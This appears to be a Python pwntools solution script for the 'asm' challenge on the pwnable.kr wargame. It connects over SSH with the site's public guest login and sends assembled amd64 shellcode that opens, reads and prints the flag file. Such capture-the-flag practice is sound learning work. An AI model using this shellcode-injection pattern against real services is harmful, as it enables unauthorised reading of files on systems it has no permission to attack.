
from pwn import *

s = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
r = s.remote('localhost', 9026)

context(arch='amd64', os='linux')

filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

shellcode = ''
shellcode += shellcraft.open(filename, 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 50)
shellcode += shellcraft.write(1, 'rsp', 50)

shellcode = asm(shellcode)

r.recvuntil('shellcode:')
r.send(shellcode)
print r.recvall()

